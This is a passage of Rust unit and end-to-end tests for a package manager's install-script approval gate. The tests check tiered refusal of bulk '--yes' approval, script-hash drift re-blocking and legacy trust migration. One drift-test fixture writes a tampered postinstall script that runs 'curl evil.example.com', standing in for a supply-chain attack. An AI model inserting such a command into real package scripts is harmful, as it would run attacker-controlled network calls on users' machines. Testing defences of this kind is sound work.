        make_blocked_tiered("risky-a", "1.0.0", StaticTier::Amber),
        make_blocked("legacy", "2.0.0"),
        make_blocked_tiered("risky-b", "3.0.0", StaticTier::Red),
    ];
    let err = enforce_tiered_yes_gate(&blocked, GateScope::Project).expect_err("mix must refuse");
    let msg = err.to_string();

    // Refusals listed.
    assert!(msg.contains("risky-a@1.0.0"), "got: {msg}");
    assert!(msg.contains("risky-b@3.0.0"), "got: {msg}");
    // Count accurate (2 refusals, not 4).
    assert!(
        msg.contains("2 package(s)"),
        "count must reflect only refusals, not the whole set; got: {msg}"
    );
    // Green and None entries NOT listed as refusals.
    assert!(
        !msg.contains("safe-a@1.0.0"),
        "green must not be listed: {msg}"
    );
    assert!(
        !msg.contains("legacy@2.0.0"),
        "None-tier must not be listed: {msg}"
    );
}

#[test]
fn yes_gate_error_message_redirects_to_interactive_path() {
    // The error must tell the user HOW to proceed; otherwise the
    // refusal is just a dead-end.
    use lpm_security::triage::StaticTier;
    let blocked = vec![make_blocked_tiered("x", "1.0.0", StaticTier::Amber)];
    let msg = enforce_tiered_yes_gate(&blocked, GateScope::Project)
        .expect_err("amber must refuse")
        .to_string();
    assert!(
        msg.contains("lpm approve-scripts")
            && (msg.contains("interactive") || msg.contains("<pkg>") || msg.contains("--list")),
        "error must redirect to the interactive / single-pkg / list path; got: {msg}"
    );
}

// ── Generalized gate over AggregateBlockedRow (global scope) ─────
//
// Pins the same refusal contract via the generic helper. Without these
// tests, a future refactor that drops `impl TieredRow for
// AggregateBlockedRow` or skips the `static_tier` field at aggregation
// time would silently reopen the global bulk-approval hole.

fn agg_row_tiered(
    name: &str,
    version: &str,
    tier: lpm_security::triage::StaticTier,
) -> crate::global_blocked_set::AggregateBlockedRow {
    crate::global_blocked_set::AggregateBlockedRow {
        name: name.into(),
        version: version.into(),
        integrity: Some("sha512-fixture".into()),
        script_hash: Some("sha256-fixture".into()),
        phases_present: vec!["postinstall".into()],
        binding_drift: false,
        static_tier: Some(tier),
        origins: vec!["origin-pkg".into()],
    }
}

fn agg_row_no_tier(name: &str, version: &str) -> crate::global_blocked_set::AggregateBlockedRow {
    crate::global_blocked_set::AggregateBlockedRow {
        name: name.into(),
        version: version.into(),
        integrity: Some("sha512-fixture".into()),
        script_hash: Some("sha256-fixture".into()),
        phases_present: vec!["postinstall".into()],
        binding_drift: false,
        static_tier: None,
        origins: vec!["origin-pkg".into()],
    }
}

#[test]
fn yes_gate_global_allows_all_green_aggregate() {
    use lpm_security::triage::StaticTier;
    let rows = vec![
        agg_row_tiered("a", "1.0.0", StaticTier::Green),
        agg_row_tiered("b", "2.0.0", StaticTier::Green),
    ];
    assert!(
        enforce_tiered_yes_gate(&rows, GateScope::Global).is_ok(),
        "all-green aggregate must pass the global gate"
    );
}

#[test]
fn yes_gate_global_passes_through_none_tier_legacy_state() {
    // Pre-classification aggregate rows (e.g. fixtures or older
    // per-install state predating the static_tier field) must
    // continue through. Parity with the project gate's pass-through
    // contract.
    let rows = vec![agg_row_no_tier("legacy", "1.0.0")];
    assert!(rows[0].static_tier.is_none());
    assert!(enforce_tiered_yes_gate(&rows, GateScope::Global).is_ok());
}

#[test]
fn yes_gate_global_refuses_amber_aggregate_row() {
    use lpm_security::triage::StaticTier;
    let rows = vec![agg_row_tiered("playwright", "1.48.0", StaticTier::Amber)];
    let err = enforce_tiered_yes_gate(&rows, GateScope::Global)
        .expect_err("amber aggregate row must refuse");
    let msg = err.to_string();
    assert!(msg.contains("--yes refuses"), "got: {msg}");
    assert!(msg.contains("playwright@1.48.0"), "got: {msg}");
    // Scope-specific redirect prose.
    assert!(
        msg.contains("--global"),
        "global-scope redirect must mention --global; got: {msg}"
    );
}

#[test]
fn yes_gate_global_refuses_red_aggregate_row() {
    use lpm_security::triage::StaticTier;
    let rows = vec![agg_row_tiered("evil-pkg", "0.0.1", StaticTier::Red)];
    let err = enforce_tiered_yes_gate(&rows, GateScope::Global)
        .expect_err("red aggregate row must refuse");
    assert!(err.to_string().contains("--yes refuses"));
}

#[test]
fn yes_gate_global_redirect_prose_is_scope_specific() {
    use lpm_security::triage::StaticTier;
    let rows = vec![agg_row_tiered("x", "1.0.0", StaticTier::Amber)];
    let global_msg = enforce_tiered_yes_gate(&rows, GateScope::Global)
        .expect_err("global gate must refuse")
        .to_string();
    // Both flag forms surface so agents redirecting users see the
    // correct command.
    assert!(
        global_msg.contains("approve-scripts --global"),
        "got: {global_msg}"
    );

    let project_blocked = vec![make_blocked_tiered("x", "1.0.0", StaticTier::Amber)];
    let project_msg = enforce_tiered_yes_gate(&project_blocked, GateScope::Project)
        .expect_err("project gate must refuse")
        .to_string();
    assert!(
        !project_msg.contains("approve-scripts --global"),
        "project redirect must not advise --global; got: {project_msg}"
    );
}

// ── end-to-end state-machine tests ─────────
//
// These exercise the full install → block → review → approve → build
// pipeline by composing build_state capture with approve-scripts
// and re-running to verify the suppression rule honors the new
// approval. The actual `lpm rebuild` script execution is out of scope
// for unit tests (it spawns child processes); the strict gate is
// verified separately by the build.rs::tests::build_strict_gate_*
// tests.
//
// The state machine cells we lock in:
//   1. install ⇒ block
//   2. install ⇒ block ⇒ approve via --yes ⇒ install ⇒ silent
//   3. install ⇒ block ⇒ approve specific pkg ⇒ install ⇒ silent
//   4. install ⇒ block ⇒ approve ⇒ script body changes ⇒ install ⇒ re-blocked
//   5. install with legacy array form ⇒ block ⇒ approve --yes ⇒ rich form
//   6. install with no scriptable packages ⇒ no state, no warning

use crate::build_state::{self, capture_blocked_set_after_install};
use lpm_security::SecurityPolicy;
use lpm_store::PackageStore;

fn fake_store_with_pkg(store_root: &Path, name: &str, version: &str, scripts: &serde_json::Value) {
    let safe = name.replace('/', "+");
    let pkg_dir = store_root.join("v1").join(format!("{safe}@{version}"));
    fs::create_dir_all(&pkg_dir).unwrap();
    let pkg = serde_json::json!({
        "name": name,
        "version": version,
        "scripts": scripts,
    });
    fs::write(
        pkg_dir.join("package.json"),
        serde_json::to_string_pretty(&pkg).unwrap(),
    )
    .unwrap();
}

fn read_policy(project_dir: &Path) -> SecurityPolicy {
    SecurityPolicy::from_package_json(&project_dir.join("package.json"))
}

#[tokio::test]
async fn e2e_install_block_review_approve_yes_then_install_is_silent() {
    let _security_backend = ensure_security_test_backend();
    // The canonical happy path: blocked → approve --yes → silent.
    let project = tempdir().unwrap();
    let store_root = tempdir().unwrap();
    let store = PackageStore::at(store_root.path().to_path_buf());
    write_default_manifest(project.path());
    fake_store_with_pkg(
        store_root.path(),
        "esbuild",
        "0.25.1",
        &serde_json::json!({"postinstall": "tsc"}),
    );

    let installed: Vec<(String, String, Option<String>)> = vec![(
        "esbuild".to_string(),
        "0.25.1".to_string(),
        Some("sha512-x".to_string()),
    )];

    // (1) First install ⇒ blocked, warning emitted
    let cap1 = capture_blocked_set_after_install(
        project.path(),
        &store,
        &installed,
        &read_policy(project.path()),
    )
    .unwrap();
    assert!(cap1.should_emit_warning);
    assert_eq!(cap1.state.blocked_packages.len(), 1);

    // (2) Approve via --yes
    run(project.path(), None, true, false, false, true)
        .await
        .unwrap();
    let manifest = read_manifest(&project.path().join("package.json"));
    assert!(
        manifest["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object(),
        "yes mode must write the rich entry"
    );

    // (3) Re-run install with the new policy ⇒ silent
    let cap2 = capture_blocked_set_after_install(
        project.path(),
        &store,
        &installed,
        &read_policy(project.path()),
    )
    .unwrap();
    assert!(
        cap2.all_clear_banner || !cap2.should_emit_warning,
        "post-approval install should be silent or emit the all-clear banner"
    );
    assert!(cap2.state.blocked_packages.is_empty());

    // (4) A SECOND post-approval install should also be silent (no
    // repeated all-clear banner).
    let cap3 = capture_blocked_set_after_install(
        project.path(),
        &store,
        &installed,
        &read_policy(project.path()),
    )
    .unwrap();
    assert!(
        !cap3.should_emit_warning,
        "second post-approval install must be silent (no banner spam)"
    );
}

#[tokio::test]
async fn e2e_install_block_approve_specific_then_install_is_silent() {
    let _security_backend = ensure_security_test_backend();
    // Same as the --yes flow but using `<pkg>` for a single approval.
    let project = tempdir().unwrap();
    let store_root = tempdir().unwrap();
    let store = PackageStore::at(store_root.path().to_path_buf());
    write_default_manifest(project.path());
    fake_store_with_pkg(
        store_root.path(),
        "esbuild",
        "0.25.1",
        &serde_json::json!({"postinstall": "tsc"}),
    );

    let installed: Vec<(String, String, Option<String>)> = vec![(
        "esbuild".to_string(),
        "0.25.1".to_string(),
        Some("sha512-x".to_string()),
    )];

    let cap1 = capture_blocked_set_after_install(
        project.path(),
        &store,
        &installed,
        &read_policy(project.path()),
    )
    .unwrap();
    assert!(cap1.should_emit_warning);

    // Approve esbuild specifically (json_output=true bypasses TTY confirm)
    run(project.path(), Some("esbuild"), false, false, false, true)
        .await
        .unwrap();

    let cap2 = capture_blocked_set_after_install(
        project.path(),
        &store,
        &installed,
        &read_policy(project.path()),
    )
    .unwrap();
    assert!(cap2.state.blocked_packages.is_empty());
}

#[tokio::test]
async fn e2e_install_block_approve_then_script_drift_re_blocks() {
    let _security_backend = ensure_security_test_backend();
    // The CRITICAL invariant — script_hash binding actually catches
    // post-approval drift. Approve, then mutate the script in the
    // store, then re-run install: package re-blocked with binding_drift = true.
    let project = tempdir().unwrap();
    let store_root = tempdir().unwrap();
    let store = PackageStore::at(store_root.path().to_path_buf());
    write_default_manifest(project.path());
    fake_store_with_pkg(
        store_root.path(),
        "esbuild",
        "0.25.1",
        &serde_json::json!({"postinstall": "tsc"}),
    );

    let installed: Vec<(String, String, Option<String>)> = vec![(
        "esbuild".to_string(),
        "0.25.1".to_string(),
        Some("sha512-x".to_string()),
    )];

    let _ = capture_blocked_set_after_install(
        project.path(),
        &store,
        &installed,
        &read_policy(project.path()),
    )
    .unwrap();
    run(project.path(), None, true, false, false, true)
        .await
        .unwrap();

    // Sanity: post-approval install is silent
    let cap_post_approve = capture_blocked_set_after_install(
        project.path(),
        &store,
        &installed,
        &read_policy(project.path()),
    )
    .unwrap();
    assert!(cap_post_approve.state.blocked_packages.is_empty());

    // Now mutate the script body in the store (simulates a tarball
    // swap or maintainer-pushed hotfix to the same version)
    fake_store_with_pkg(
        store_root.path(),
        "esbuild",
        "0.25.1",
        &serde_json::json!({"postinstall": "node install.js && curl evil.example.com"}),
    );

    // Re-run install ⇒ esbuild MUST be re-blocked with drift flag
    let cap_drift = capture_blocked_set_after_install(
        project.path(),
        &store,
        &installed,
        &read_policy(project.path()),
    )
    .unwrap();
    assert!(
        cap_drift.should_emit_warning,
        "drift must re-emit the warning"
    );
    assert_eq!(cap_drift.state.blocked_packages.len(), 1);
    assert!(
        cap_drift.state.blocked_packages[0].binding_drift,
        "drifted package must be flagged with binding_drift = true"
    );
}

#[tokio::test]
async fn e2e_install_with_legacy_array_form_does_not_break_install() {
    // Backwards-compat: a project with the pre-existing legacy array
    // form must still install. The strict gate sees LegacyNameOnly
    // for the listed package and treats it as approved (with a
    // deprecation warning at build time, but install is fine).
    let project = tempdir().unwrap();
    let store_root = tempdir().unwrap();
    let store = PackageStore::at(store_root.path().to_path_buf());
    write_manifest(
        &project.path().join("package.json"),
        &serde_json::json!({
            "name": "test",
            "version": "0.0.0",
            "lpm": {
                "trustedDependencies": ["esbuild"],
            },
        }),
    );
    fake_store_with_pkg(
        store_root.path(),
        "esbuild",
        "0.25.1",
        &serde_json::json!({"postinstall": "tsc"}),
    );

    let cap = capture_blocked_set_after_install(
        project.path(),
        &store,
        &[(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )],
        &read_policy(project.path()),
    )
    .unwrap();

    // Legacy bare-name approval is enough to NOT block — install
    // proceeds silently. The deprecation warning is emitted at
    // `lpm rebuild` time, not here.
    assert!(cap.state.blocked_packages.is_empty());
    assert!(!cap.should_emit_warning);
}

#[tokio::test]
async fn e2e_install_with_legacy_then_approve_yes_upgrades_to_rich() {
    let _security_backend = ensure_security_test_backend();
    // Migration path: project starts with the legacy array form, a
    // NEW package gets installed that needs approval, --yes upgrades
    // the manifest to the rich form AND preserves the existing legacy
    // entries.
    let project = tempdir().unwrap();
    let store_root = tempdir().unwrap();
    let store = PackageStore::at(store_root.path().to_path_buf());
    write_manifest(
        &project.path().join("package.json"),
        &serde_json::json!({
            "name": "test",
            "version": "0.0.0",
            "lpm": {
                "trustedDependencies": ["sharp"],
            },
        }),
    );
    // sharp is approved (legacy), esbuild is NOT
    fake_store_with_pkg(
        store_root.path(),
        "sharp",
        "0.33.0",
        &serde_json::json!({"install": "node-gyp rebuild"}),
    );
    fake_store_with_pkg(
        store_root.path(),
        "esbuild",
        "0.25.1",
        &serde_json::json!({"postinstall": "tsc"}),
    );

    let installed: Vec<(String, String, Option<String>)> = vec![
        ("sharp".to_string(), "0.33.0".to_string(), None),
        ("esbuild".to_string(), "0.25.1".to_string(), None),
    ];
    let cap = capture_blocked_set_after_install(
        project.path(),
        &store,
        &installed,
        &read_policy(project.path()),
    )
    .unwrap();
    // Only esbuild is blocked (sharp is legacy-approved)
    assert_eq!(cap.state.blocked_packages.len(), 1);
    assert_eq!(cap.state.blocked_packages[0].name, "esbuild");

    // Bulk approve
    run(project.path(), None, true, false, false, true)
        .await
        .unwrap();

    // Manifest is now Rich form with BOTH entries
    let manifest = read_manifest(&project.path().join("package.json"));
    let td = &manifest["lpm"]["trustedDependencies"];
    assert!(td.is_object(), "must be Rich form after first approval");
    let map = td.as_object().unwrap();
    assert!(map.contains_key("esbuild@0.25.1"), "new approval");
    assert!(
        map.contains_key("sharp@*"),
        "legacy entry preserved as `<name>@*`"
    );

    // Lenient lookup still finds sharp via the @* sentinel — install
    // continues to honor it for the legacy use case.
    let policy_after = read_policy(project.path());
    assert!(policy_after.can_run_scripts("sharp"));
}

// ── — --yes refusal e2e via run() ──────────

#[tokio::test]
async fn e2e_yes_refuses_when_any_entry_is_amber_and_manifest_stays_unchanged() {
    let _security_backend = ensure_security_test_backend();
    // End-to-end confirmation that the refusal gate wires through
    // to the `run()` entry point the CLI dispatches to. Amber
    // package (playwright install — a D18 downloader) MUST NOT
    // be approved by --yes.
    let project = tempdir().unwrap();
    let store_root = tempdir().unwrap();
    let store = PackageStore::at(store_root.path().to_path_buf());
    write_default_manifest(project.path());
    fake_store_with_pkg(
        store_root.path(),
        "playwright",
        "1.48.0",
        &serde_json::json!({ "postinstall": "playwright install" }),
    );

    let installed: Vec<(String, String, Option<String>)> = vec![(
        "playwright".to_string(),
        "1.48.0".to_string(),
        Some("sha512-x".to_string()),
    )];
    let cap = capture_blocked_set_after_install(
        project.path(),
        &store,
        &installed,
        &read_policy(project.path()),
    )
    .unwrap();
    assert_eq!(cap.state.blocked_packages.len(), 1);
    assert_eq!(
        cap.state.blocked_packages[0].static_tier,
        Some(lpm_security::triage::StaticTier::Amber),
        "D18 `playwright install` must persist as Amber"
    );

    // Snapshot manifest before --yes so we can prove non-mutation.
    let manifest_before = read_manifest(&project.path().join("package.json"));

    // --yes must refuse.
    let err = run(project.path(), None, true, false, false, true)
        .await
        .expect_err("--yes against an amber blocked entry must error");
    let msg = err.to_string();
    assert!(msg.contains("--yes refuses"), "got: {msg}");
    assert!(msg.contains("playwright@1.48.0"), "got: {msg}");

    // Manifest MUST be byte-identical to before — the gate sits
    // before any write_back, so a refusal can't leak a partial
    // approval.
    let manifest_after = read_manifest(&project.path().join("package.json"));
    assert_eq!(
        manifest_before, manifest_after,
        "manifest must be unchanged after a --yes refusal"
    );
    // Specifically: trustedDependencies must not exist / be
    // empty. Either form is acceptable — some projects don't
    // have the key at all.
    assert!(
        manifest_after["lpm"]["trustedDependencies"]
            .as_object()
            .is_none()
            || manifest_after["lpm"]["trustedDependencies"]
                .as_object()
                .unwrap()
                .is_empty(),
        "no trustedDependencies entry must be written on refusal"
    );
}

#[tokio::test]
async fn e2e_yes_approves_all_green_and_does_not_refuse() {
    let _security_backend = ensure_security_test_backend();
    // Inverse contract: an all-green blocked set passes the
    // gate and --yes approves as before.
    let project = tempdir().unwrap();
    let store_root = tempdir().unwrap();
    let store = PackageStore::at(store_root.path().to_path_buf());
    write_default_manifest(project.path());
    fake_store_with_pkg(
        store_root.path(),
        "typescript",
        "5.0.0",
        &serde_json::json!({ "postinstall": "tsc" }),
    );

    let installed: Vec<(String, String, Option<String>)> = vec![(
        "typescript".to_string(),
        "5.0.0".to_string(),
        Some("sha512-t".to_string()),
    )];
    let cap = capture_blocked_set_after_install(
        project.path(),
        &store,
        &installed,
        &read_policy(project.path()),
    )
    .unwrap();
    assert_eq!(
        cap.state.blocked_packages[0].static_tier,
        Some(lpm_security::triage::StaticTier::Green),
        "tsc body must persist as Green",
    );

    run(project.path(), None, true, false, false, true)
        .await
        .expect("all-green --yes must succeed");

    let manifest = read_manifest(&project.path().join("package.json"));
    assert!(
        manifest["lpm"]["trustedDependencies"]["typescript@5.0.0"].is_object(),
        "green package must be approved after --yes"
    );
}

#[tokio::test]
async fn e2e_yes_passes_through_when_static_tier_is_none_legacy_state() {
    let _security_backend = ensure_security_test_backend();
    // Pre-P2 upgrade path: if the persisted BuildState predates
    // (static_tier = None on every entry), --yes must still
    // work so upgrading LPM doesn't silently break existing
    // agent/CI flows. The next fresh install will recapture
    // tiers and from then on the gate applies.
    let project = tempdir().unwrap();
    write_default_manifest(project.path());
    // Craft a state file manually with static_tier = None,
    // bypassing the fresh capture path that would populate it.
    write_state(project.path(), vec![make_blocked("legacy-pkg", "1.0.0")]);

    run(project.path(), None, true, false, false, true)
        .await
        .expect("--yes against None-tiered (legacy) state must succeed");

    let manifest = read_manifest(&project.path().join("package.json"));
    assert!(
        manifest["lpm"]["trustedDependencies"]["legacy-pkg@1.0.0"].is_object(),
        "legacy-state entry must be approved on --yes pass-through",
    );
}

#[tokio::test]
async fn e2e_install_with_no_scriptable_packages_no_state_no_warning() {
    // Defensive: a project that installs only packages with no install
    // scripts must not emit any banner.
    let project = tempdir().unwrap();
    let store_root = tempdir().unwrap();
    let store = PackageStore::at(store_root.path().to_path_buf());
    write_default_manifest(project.path());
    fake_store_with_pkg(
        store_root.path(),
        "lodash",
        "4.17.21",
        &serde_json::json!({}),
    );

    let cap = capture_blocked_set_after_install(
        project.path(),
        &store,
        &[("lodash".to_string(), "4.17.21".to_string(), None)],
        &read_policy(project.path()),
    )
    .unwrap();
    assert!(cap.state.blocked_packages.is_empty());
    assert!(!cap.should_emit_warning);
    // State file is still written (so future installs share the same
    // empty fingerprint), but no warning fired.
    assert!(build_state::read_build_state(project.path()).is_some());
}

// ── filter persisted state through current trust ──
//
// The persisted build-state.json is only refreshed by `lpm install`. If
// the user approves a package via `lpm approve-scripts` and then runs
// `--list` or `--yes` again WITHOUT re-installing, the helper must
// recompute "is this still blocked?" against the CURRENT manifest, not
// against the stale state file. The state file alone is not
// authoritative after a trust edit until the next install refreshes it.

// ── Effective blocked set helper ( surgical primitive) ──
//
// The pure helper that filters the persisted state through the current
// trust. Tested directly because reaching it through the `run` function
// pollutes stdout with TUI / JSON formatting and makes assertions noisy.

/// **AUDIT REGRESSION ():** filter must REMOVE entries
/// covered by a Strict match in the current trustedDependencies.
#[test]
fn compute_effective_blocked_set_removes_strict_matches() {
    let state = BuildState {
        state_version: BUILD_STATE_VERSION,
        blocked_set_fingerprint: "sha256-test".into(),
        captured_at: "T00:00:00Z".into(),
        blocked_packages: vec![
            make_blocked("esbuild", "0.25.1"),
            make_blocked("sharp", "0.33.0"),
        ],
        drift_ignore_override: None,
    };
    // esbuild approved strictly, sharp not.
    let mut map = std::collections::HashMap::new();
    map.insert(
        "esbuild@0.25.1".to_string(),
        TrustedDependencyBinding {
            integrity: Some("sha512-esbuild-integrity".into()),
            script_hash: Some("sha256-esbuild-hash".into()),
            ..Default::default()
        },
    );
    let trusted = TrustedDependencies::Rich(map);

    let effective = compute_effective_blocked_set(
        &state,
        &trusted,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
    );
    assert_eq!(effective.len(), 1);
    assert_eq!(effective[0].name, "sharp");
}

/// **AUDIT REGRESSION ():** filter must REMOVE entries
/// covered by a LegacyNameOnly match (the legacy bare-name approval is
/// honored at install time, so it's not "blocked").
#[test]
fn compute_effective_blocked_set_removes_legacy_name_only_matches() {
    let state = BuildState {
        state_version: BUILD_STATE_VERSION,
        blocked_set_fingerprint: "sha256-test".into(),
        captured_at: "T00:00:00Z".into(),
        blocked_packages: vec![make_blocked("esbuild", "0.25.1")],
        drift_ignore_override: None,
    };
    let trusted = TrustedDependencies::Legacy(vec!["esbuild".into()]);

    let effective = compute_effective_blocked_set(
        &state,
        &trusted,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
    );
    assert!(
        effective.is_empty(),
        "legacy bare-name approval must be honored as 'not blocked'"
    );
}

/// **AUDIT REGRESSION ():** drifted entries must
/// REMAIN in the effective blocked set even when the manifest has
/// an entry for the same `name@version`. Drift is the whole reason
/// we re-review.
#[test]
fn compute_effective_blocked_set_keeps_drifted_entries() {
    let mut blocked = make_blocked("esbuild", "0.25.1");
    blocked.script_hash = Some("sha256-NEW".to_string()); // drifted from stored
    let state = BuildState {
        state_version: BUILD_STATE_VERSION,
        blocked_set_fingerprint: "sha256-test".into(),
        captured_at: "T00:00:00Z".into(),
        blocked_packages: vec![blocked],
        drift_ignore_override: None,
    };
    let mut map = std::collections::HashMap::new();
    map.insert(
        "esbuild@0.25.1".to_string(),
        TrustedDependencyBinding {
            integrity: Some("sha512-esbuild-integrity".into()),
            script_hash: Some("sha256-OLD".into()),
            ..Default::default()
        },
    );
    let trusted = TrustedDependencies::Rich(map);

    let effective = compute_effective_blocked_set(
        &state,
        &trusted,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
    );
    assert_eq!(
        effective.len(),
        1,
        "drifted entry must STAY in the effective blocked set"
    );
}

/// **AUDIT REGRESSION ():** unrelated entries are
/// untouched (NotTrusted entries always stay blocked).
#[test]
fn compute_effective_blocked_set_keeps_not_trusted_entries() {
    let state = BuildState {
        state_version: BUILD_STATE_VERSION,
        blocked_set_fingerprint: "sha256-test".into(),
        captured_at: "T00:00:00Z".into(),
        blocked_packages: vec![make_blocked("esbuild", "0.25.1")],
        drift_ignore_override: None,
    };
    let trusted = TrustedDependencies::default();
    let effective = compute_effective_blocked_set(
        &state,
        &trusted,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
    );
    assert_eq!(effective.len(), 1);
}

/// **AUDIT REGRESSION ( +  interaction):**
/// After `upgrade_to_rich` writes a `<name>@*` migration sentinel
/// for a previously-legacy approval, the package MUST remain in
/// the effective blocked set until the user concretely approves
/// the specific version via `lpm approve-scripts`. Honoring the
/// sentinel here would auto-trust every future version under the
/// inherited name-only approval (cross-version trust laundering).
#[test]
fn compute_effective_blocked_set_keeps_package_blocked_under_at_star_sentinel() {
    let state = BuildState {
        state_version: BUILD_STATE_VERSION,
        blocked_set_fingerprint: "sha256-test".into(),
        captured_at: "T00:00:00Z".into(),
        blocked_packages: vec![make_blocked("esbuild", "0.25.1")],
        drift_ignore_override: None,
    };
    // Simulate post-upgrade state: legacy esbuild → esbuild@* sentinel
    let mut td = TrustedDependencies::Legacy(vec!["esbuild".into()]);
    td.upgrade_to_rich();

    let effective = compute_effective_blocked_set(
        &state,
        &td,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
    );
    assert_eq!(
        effective.len(),
        1,
        "esbuild@* sentinel must NOT clear esbuild@0.25.1 from the \
             blocked set — the user must explicitly approve the concrete \
             version via `lpm approve-scripts`, which writes a strict \
             `esbuild@0.25.1` binding"
    );
    assert_eq!(effective[0].name, "esbuild");
}

/// **AUDIT REGRESSION ():** `--list` must NOT include
/// any package that the current `package.json::lpm.trustedDependencies`
/// already covers strictly.
#[tokio::test]
async fn approve_scripts_list_filters_already_approved_packages_from_current_trust() {
    let dir = tempdir().unwrap();
    // The state file says esbuild is blocked
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
    // But the manifest already has a strict approval that matches the
    // exact integrity + script_hash from the state file.
    write_manifest(
        &dir.path().join("package.json"),
        &serde_json::json!({
            "name": "test",
            "version": "0.0.0",
            "lpm": {
                "trustedDependencies": {
                    "esbuild@0.25.1": {
                        "integrity": "sha512-esbuild-integrity",
                        "scriptHash": "sha256-esbuild-hash"
                    }
                }
            }
        }),
    );

    // --list mode should print "nothing to approve" because esbuild is
    // already strict-approved, even before the next install refreshes
    // state.
    run(dir.path(), None, false, true, false, true)
        .await
        .unwrap();

    // Sanity: the state file is unchanged (--list is read-only)
    let state = build_state::read_build_state(dir.path()).unwrap();
    assert_eq!(state.blocked_packages.len(), 1);
    // The fix is in the rendering, not in the state file.
}

/// **AUDIT REGRESSION ():** `--yes` must skip already-approved
/// packages and not re-write them.
#[tokio::test]
async fn approve_scripts_yes_skips_packages_already_strict_approved_in_manifest() {
    let _security_backend = ensure_security_test_backend();
    let dir = tempdir().unwrap();
    write_state(
        dir.path(),
        vec![
            make_blocked("esbuild", "0.25.1"),
            make_blocked("sharp", "0.33.0"),
        ],
    );
    // esbuild is already strict-approved; sharp is not.
    write_manifest(
        &dir.path().join("package.json"),
        &serde_json::json!({
            "name": "test",
            "version": "0.0.0",
            "lpm": {
                "trustedDependencies": {
                    "esbuild@0.25.1": {
                        "integrity": "sha512-esbuild-integrity",
                        "scriptHash": "sha256-esbuild-hash"
                    }
                }
            }
        }),
    );

    // --yes should approve ONLY sharp (esbuild is already strict-trusted)
    run(dir.path(), None, true, false, false, true)
        .await
        .unwrap();

    let after = read_manifest(&dir.path().join("package.json"));
    let map = after["lpm"]["trustedDependencies"]
        .as_object()
        .expect("Rich form");
    assert!(map.contains_key("esbuild@0.25.1"), "esbuild preserved");
    assert!(map.contains_key("sharp@0.33.0"), "sharp newly approved");
    // The esbuild binding must NOT have been re-written from the
    // state file (which would be a no-op overwrite, but we want the
    // helper to skip already-approved entries entirely).
    assert_eq!(
        map["esbuild@0.25.1"]["integrity"], "sha512-esbuild-integrity",
        "esbuild binding preserved unchanged"
    );
}

/// **AUDIT REGRESSION ():** `<pkg>` must reject a package
/// argument that points at an already-approved entry, with a clear
/// "already approved" message rather than a useless re-approval.
#[tokio::test]
async fn approve_scripts_specific_pkg_for_already_approved_is_a_no_op_with_message() {
    let dir = tempdir().unwrap();
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
    write_manifest(
        &dir.path().join("package.json"),
        &serde_json::json!({
            "name": "test",
            "version": "0.0.0",
            "lpm": {
                "trustedDependencies": {
                    "esbuild@0.25.1": {
                        "integrity": "sha512-esbuild-integrity",
                        "scriptHash": "sha256-esbuild-hash"
                    }
                }
            }
        }),
    );

    // Asking to approve esbuild specifically should error with
    // "already approved", NOT silently re-write the entry.
    let err = run(dir.path(), Some("esbuild"), false, false, false, true)
        .await
        .unwrap_err();
    let msg = err.to_string();
    assert!(
        msg.contains("already approved"),
        "expected an 'already approved' message, got: {msg}"
    );
}

/// **AUDIT REGRESSION ():** if EVERY package in the
/// persisted state is already approved, `--list` should report nothing
/// to approve (empty effective blocked set), not the stale entries.
#[tokio::test]
async fn approve_scripts_list_reports_nothing_when_all_persisted_blocked_are_already_approved() {
    let dir = tempdir().unwrap();
    write_state(
        dir.path(),
        vec![
            make_blocked("esbuild", "0.25.1"),
            make_blocked("sharp", "0.33.0"),
        ],
    );
    write_manifest(
        &dir.path().join("package.json"),
        &serde_json::json!({
            "name": "test",
            "version": "0.0.0",
            "lpm": {
                "trustedDependencies": {
                    "esbuild@0.25.1": {
                        "integrity": "sha512-esbuild-integrity",
                        "scriptHash": "sha256-esbuild-hash"
                    },
                    "sharp@0.33.0": {
                        "integrity": "sha512-sharp-integrity",
                        "scriptHash": "sha256-sharp-hash"
                    }
                }
            }
        }),
    );

    run(dir.path(), None, false, true, false, true)
        .await
        .unwrap();

    // The package.json must be byte-identical (no rewrite happened)
    let after = read_manifest(&dir.path().join("package.json"));
    assert_eq!(
        after["lpm"]["trustedDependencies"]
            .as_object()
            .unwrap()
            .len(),
        2
    );
}

/// **AUDIT REGRESSION ():** drift overrides "already approved".
/// If the persisted state shows a script_hash that drifts from the
/// stored binding, the package MUST appear in the effective blocked
/// set (this is the whole point of script-hash binding).
#[tokio::test]
async fn approve_scripts_yes_does_not_skip_packages_with_binding_drift() {
    let _security_backend = ensure_security_test_backend();
    let dir = tempdir().unwrap();
    // State file claims script_hash = sha256-NEW
    let mut blocked = make_blocked("esbuild", "0.25.1");
    blocked.script_hash = Some("sha256-NEW".to_string());
    blocked.binding_drift = true;
    write_state(dir.path(), vec![blocked]);

    // Manifest has the OLD binding
    write_manifest(
        &dir.path().join("package.json"),
        &serde_json::json!({
            "name": "test",
            "version": "0.0.0",
            "lpm": {
                "trustedDependencies": {
                    "esbuild@0.25.1": {
                        "integrity": "sha512-esbuild-integrity",
                        "scriptHash": "sha256-OLD"
                    }
                }
            }
        }),
    );

    // --yes should re-approve esbuild with the NEW script_hash from
    // the state file because the binding drifted.
    run(dir.path(), None, true, false, false, true)
        .await
        .unwrap();

    let after = read_manifest(&dir.path().join("package.json"));
    let binding = &after["lpm"]["trustedDependencies"]["esbuild@0.25.1"];
    assert_eq!(
        binding["scriptHash"], "sha256-NEW",
        "drift must trigger re-approval with the new script hash"
    );
}

// ── --json mode emits exactly one JSON payload ──
//
// The bug: emit_yes_warning_banner unconditionally calls tracing::warn!,
// and the tracing subscriber in main.rs writes to stdout (no
// .with_writer(stderr) configured). So a `--yes --json` invocation
// produces a WARN line on stdout BEFORE the JSON object, breaking any
// downstream JSON.parse.
//
// We can't easily intercept tracing output from a unit test (the
// global subscriber is set once per process), so the unit-level
// regression here just verifies the BEHAVIOR contract: in JSON mode,
